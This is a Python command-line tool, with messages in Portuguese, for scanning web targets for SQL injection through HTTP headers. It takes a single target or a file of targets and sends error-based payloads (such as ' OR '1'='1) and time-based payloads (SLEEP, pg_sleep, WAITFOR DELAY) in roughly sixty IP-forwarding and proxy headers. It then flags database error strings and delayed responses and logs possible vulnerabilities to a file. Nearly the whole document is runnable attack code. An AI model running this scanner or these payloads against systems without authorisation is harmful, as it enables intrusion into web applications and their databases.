#!/usr/bin/env python3

import requests
import time
import argparse
from concurrent.futures import ThreadPoolExecutor

requests.packages.urllib3.disable_warnings()

# ---------------- HEADERS ----------------
HEADERS_LIST = [
    "X-Forwarded-For","Forwarded","X-Real-IP","X-Forwarded","X-Forwarded-By",
    "X-Forwarded-Host","X-Forwarded-Server","X-Forwarded-Port","X-Forwarded-Proto",
    "X-Forwarded-Scheme","X-Forwarded-SSL","CF-Connecting-IP","True-Client-IP",
    "Fastly-Client-IP","X-Azure-ClientIP","X-Google-Real-IP",
    "CloudFront-Viewer-Address","CloudFront-Viewer-Country","X-Amzn-Trace-Id",
    "X-Edge-IP","X-Client-IP","X-Cluster-Client-IP","X-ProxyUser-IP",
    "WL-Proxy-Client-IP","Proxy-Client-IP","X-Original-Forwarded-For",
    "X-Originating-IP","X-Original-IP","X-Remote-IP","X-Remote-Addr",
    "X-Original-Remote-Addr","Client-IP","Client-IP-Addr","Remote-Addr",
    "Remote-IP","Real-IP","X-Proxy-IP","X-Forwarded-For-Original",
    "Forwarded-For","X-Forwarded-For-IP","X-Forwarded-For-Client-IP",
    "X-Forwarded-For-Remote-Addr","X-Custom-IP-Authorization","X-User-IP",
    "X-Client-IP-Addr","X-Client-Address","X-Remote-User-IP",
    "X-Remote-User-Addr","Front-End-Https","X-HTTPS","X-Original-URL",
    "X-Rewrite-URL","Akamai-Origin-Hop","X-Sucuri-Clientip",
    "X-Imperva-Client-IP","X-NF-Client-Connection-IP",
    "X-Vercel-Forwarded-For","Fly-Client-IP","X-Shopify-Client-Ip",
    "X-Cdn-Client-Ip","X-Bb-Ip"
]

# ---------------- PAYLOADS ----------------
ERROR_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "'--"]

TIME_PAYLOADS = [
    "' OR SLEEP(5)-- -",
    "' OR pg_sleep(5)-- -",
    "'; WAITFOR DELAY '0:0:5'--"
]

ERROR_SIGNATURES = [
    "sql syntax","mysql","warning","odbc","native client",
    "syntax error","unclosed quotation","postgresql",
    "pg_query","sqlite","fatal error"
]

# ---------------- UTILS ----------------

def get_baseline(url):
    times = []
    for _ in range(3):
        try:
            start = time.time()
            requests.get(url, timeout=10, verify=False)
            times.append(time.time() - start)
        except:
            pass
    return (sum(times) / len(times)) if times else 1.0


def resolve_target(target):
    if target.startswith("http://") or target.startswith("https://"):
        return target

    for scheme in ["https://", "http://"]:
        url = scheme + target
        try:
            r = requests.get(url, timeout=5, verify=False)
            print(f"[+] Alive: {url} ({r.status_code})")
            return url
        except:
            continue

    print(f"[-] Host down: {target}")
    return None


# ---------------- CORE ----------------

def test_header(url, header, time_threshold):
    findings = []

    # ERROR BASED
    for payload in ERROR_PAYLOADS:
        time.sleep(0.2)
        try:
            r = requests.get(url, headers={header: payload}, timeout=10, verify=False)

            if r.status_code >= 500:
                findings.append(f"[500] {header} → {payload}")

            for sig in ERROR_SIGNATURES:
                if sig in r.text.lower():
                    findings.append(f"[ERROR] {header} → {payload} ({sig})")

        except:
            pass

    # TIME BASED
    for payload in TIME_PAYLOADS:
        time.sleep(0.2)
        try:
            start = time.time()
            requests.get(url, headers={header: payload}, timeout=15, verify=False)
            elapsed = time.time() - start

            if elapsed > time_threshold:
                findings.append(f"[TIME] {header} → {payload} ({elapsed:.2f}s)")

        except:
            pass

    return findings


def test_target(target):
    url = resolve_target(target)
    if not url:
        return

    print(f"\n=== Testando: {url} ===")

    baseline = get_baseline(url)
    time_threshold = baseline + 3.5

    print(f"[i] Baseline: {baseline:.2f}s | Threshold: {time_threshold:.2f}s")

    results = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_header, url, h, time_threshold) for h in HEADERS_LIST]

        for f in futures:
            try:
                res = f.result()
                if res:
                    results.extend(res)
            except Exception as e:
                print(f"[ERR] Thread falhou: {e}")

    if results:
        print(f"\n[!!!] Possíveis vulnerabilidades em {url}")
        for r in results:
            print(r)

        with open("resultados.txt", "a") as out:
            out.write(f"\n=== {url} ===\n")
            out.write("\n".join(results) + "\n")

    else:
        print("[-] Nenhum comportamento suspeito detectado")


# ---------------- MAIN ----------------

def main():
    parser = argparse.ArgumentParser(description="SQLi Header Tester")
    parser.add_argument("-t", "--target", help="Alvo único")
    parser.add_argument("-a", "--arquivo", help="Lista de alvos")

    args = parser.parse_args()

    targets = []

    if args.target:
        targets.append(args.target.strip())

    if args.arquivo:
        with open(args.arquivo) as f:
            for line in f:
                line = line.strip()
                if line:
                    targets.append(line)

    if not targets:
        print("Use -t ou -a")
        return

    for t in targets:
        test_target(t)


if __name__ == "__main__":
    main()
